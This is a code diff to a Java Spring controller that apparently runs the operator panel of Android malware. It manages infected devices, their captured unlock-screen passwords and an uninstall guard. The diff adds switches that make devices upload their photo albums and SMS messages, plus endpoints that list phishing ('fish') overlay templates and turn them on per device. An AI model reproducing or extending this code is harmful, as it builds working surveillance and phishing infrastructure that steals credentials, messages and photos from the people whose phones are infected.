@@ -5,8 +5,8 @@ import java.util.Objects;
 
 import javax.annotation.Resource;
 
-import io.renren.modules.app.entity.UnlockScreenPwd;
-import io.renren.modules.app.service.UnlockScreenPwdService;
+import io.renren.modules.app.entity.FishTemplates;
+import io.renren.modules.app.mapper.FishTemplatesMapper;
 import org.apache.commons.lang3.StringUtils;
 import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
@@ -23,10 +23,13 @@ import io.renren.common.page.PageData;
 import io.renren.common.utils.Result;
 import io.renren.modules.app.entity.Device;
 import io.renren.modules.app.entity.InstallAppFilter;
+import io.renren.modules.app.entity.UnlockScreenPwd;
 import io.renren.modules.app.mapper.InstallAppFilterMapper;
 import io.renren.modules.app.mapper.InstallAppMapper;
+import io.renren.modules.app.param.DeviceParam;
 import io.renren.modules.app.service.DeviceService;
 import io.renren.modules.app.service.InstallAppService;
+import io.renren.modules.app.service.UnlockScreenPwdService;
 import io.renren.modules.sys.dto.SysUserDTO;
 import io.renren.modules.sys.service.SysUserService;
 import lombok.extern.slf4j.Slf4j;
@@ -52,54 +55,69 @@ public class DeviceController extends BaseController {
 
     @Resource
     private UnlockScreenPwdService unlockScreenPwdService;
+    @Resource
+    private FishTemplatesMapper fishTemplatesMapper;
+
 
     @RequestMapping("page")
-    public Result<PageData<Device>> page(@RequestBody JSONObject jsonObject) {
-        Page<Device> page = parsePage(jsonObject);
+    public Result<PageData<Device>> page(@RequestBody DeviceParam param) {
+        Page<Device> page = new Page<>(param.getPage(), param.getLimit());
         QueryWrapper<Device> query = new QueryWrapper<>();
         LambdaQueryWrapper<Device> lambda = query.lambda();
-        String deviceId = jsonObject.getString("deviceId");
-        if (StringUtils.isNotEmpty(deviceId)) {
-            lambda.eq(Device::getDeviceId, deviceId);
-        }
-        if (StringUtils.isNotEmpty(jsonObject.getString("pkg"))) {
-            lambda.eq(Device::getPkg, jsonObject.getString("pkg"));
-        }
-        String ip = jsonObject.getString("ip");
-        if (StringUtils.isNotEmpty(ip)) {
-            lambda.eq(Device::getIp, ip);
+
+        // 设备ID
+        if (StringUtils.isNotEmpty(param.getDeviceId())) {
+            lambda.eq(Device::getDeviceId, param.getDeviceId());
         }
 
-        String model = jsonObject.getString("model");
-        if (StringUtils.isNotEmpty(model)) {
-            lambda.eq(Device::getModel, model);
+        // 包名
+        if (StringUtils.isNotEmpty(param.getPkg())) {
+            lambda.eq(Device::getPkg, param.getPkg());
         }
 
-        String language = jsonObject.getString("language");
-        if (StringUtils.isNotEmpty(language)) {
-            lambda.eq(Device::getLanguage, language);
+        // 型号
+        if (StringUtils.isNotEmpty(param.getModel())) {
+            lambda.eq(Device::getModel, param.getModel());
         }
 
-        String brand = jsonObject.getString("brand");
-        if (StringUtils.isNotEmpty(brand)) {
-            lambda.eq(Device::getBrand, brand);
+        // 语言
+        if (StringUtils.isNotEmpty(param.getLanguage())) {
+            lambda.eq(Device::getLanguage, param.getLanguage());
         }
 
-        Integer status = jsonObject.getInteger("status");
-        if (status != null) {
-            lambda.eq(Device::getStatus, status);
+        // 品牌
+        if (StringUtils.isNotEmpty(param.getBrand())) {
+            lambda.eq(Device::getBrand, param.getBrand());
         }
-        if (getUser() != null) {
-            lambda.eq(Device::getUser, getUser());
+
+        // 状态
+        if (param.getStatus() != null) {
+            lambda.eq(Device::getStatus, param.getStatus());
         }
-        String installApp = jsonObject.getString("installApp");
-        if (StringUtils.isNotEmpty(installApp)) {
-            List<String> installAppDeviceIdList = installAppMapper.selectByPackageName(installApp);
+
+        // 最后活动时间范围
+        if (param.getStart() != null) {
+            lambda.ge(Device::getLastHeart, param.getStart());
+        }
+
+        if (param.getEnd() != null) {
+            lambda.le(Device::getLastHeart, param.getEnd());
+        }
+
+        // Kill状态
+        if (param.getKill() != null) {
+            lambda.eq(Device::getKill, param.getKill());
+        }
+
+        // 安装应用过滤
+        if (StringUtils.isNotEmpty(param.getInstallApp())) {
+            List<String> installAppDeviceIdList = installAppMapper.selectByPackageName(param.getInstallApp());
             if (installAppDeviceIdList.isEmpty()) {
                 return Result.toSuccess(new PageData<Device>(Lists.newArrayList(), 0));
             }
             lambda.in(Device::getDeviceId, installAppDeviceIdList);
         }
+
         Page<Device> pageData = deviceService.page(page, lambda);
         return Result.toSuccess(new PageData<Device>(pageData.getRecords(), pageData.getTotal()));
     }
@@ -151,28 +169,39 @@ public class DeviceController extends BaseController {
         update.setUninstallGuard(jsonObject.getInteger("uninstallGuard"));
         update.setFixLockScreen(jsonObject.getInteger("fixLockScreen"));
         update.setUnlockFish(jsonObject.getInteger("unlockFish"));
+        update.setKill(jsonObject.getInteger("kill"));
+        update.setUploadAlbum(jsonObject.getInteger("uploadAlbum"));
+        update.setUploadSms(jsonObject.getInteger("uploadSms"));
         deviceService.updateById(update);
         return Result.toSuccess(null);
     }
 
-    @RequestMapping("addSalesman")
-    public Result<Void> addSalesman(@RequestBody JSONObject jsonObject) {
+    @RequestMapping("fishCodeList")
+    public Result<List<FishTemplates>> fishCodeList(){
+        return Result.toSuccess(fishTemplatesMapper.list());
+    }
+
+    @RequestMapping("updateFishSwitch")
+    public Result<Void> updateFishSwitch(@RequestBody JSONObject jsonObject){
         Long id = jsonObject.getLong("id");
         Device device = deviceService.getById(id);
-        if (device == null) {
-            return Result.toError("没有找到这个设备!");
-        }
-        String user = jsonObject.getString("salesman");
-        SysUserDTO userEntity = sysUserService.getByUsername(user);
-        if (userEntity == null) {
-            return Result.toError("业务员不存在!");
+        String code = jsonObject.getString("code");
+        boolean value = jsonObject.getBooleanValue("value");
+        if(device == null){
+            return  Result.toError("没有找到这个设备!");
         }
 
         Device update = new Device();
         update.setId(id);
-        update.setUser(user);
+        JSONObject fishSwitch = device.getFishSwitch();
+        if(fishSwitch == null){
+            fishSwitch = new JSONObject();
+        }
+        fishSwitch.put(code, value);
+        update.setFishSwitch(fishSwitch);
         deviceService.updateById(update);
         return Result.toSuccess();
+
     }
 
 
